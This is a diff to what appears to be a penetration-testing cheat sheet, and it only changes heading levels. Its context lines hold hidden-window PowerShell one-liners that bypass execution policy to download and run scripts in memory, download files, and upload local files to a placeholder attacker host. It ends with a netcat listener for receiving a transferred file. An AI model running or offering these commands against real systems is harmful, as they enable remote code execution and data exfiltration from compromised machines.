@@ -1,6 +1,6 @@
 ## Start up WebServer
 
-## Run script in memory:
+### Run script in memory:
 ```ps
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/FILE')
 
@@ -11,7 +11,8 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.WebClient).D
 IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/FILE'))
 ```
 -----------------------------------------------------------------------------------------------------------------------------------------------------
-# Download File:
+
+## Download File:
 ```ps
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 
@@ -20,7 +21,7 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClien
 ```
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------
-# Upload File:
+## Upload File:
 ```ps
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 
@@ -29,7 +30,8 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClien
 ```
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------
-# If you can't copy over SMB
+
+## If you can't copy over SMB
 ### On Local Box
 ```sh
 nc -lnvp 443 > Out.File
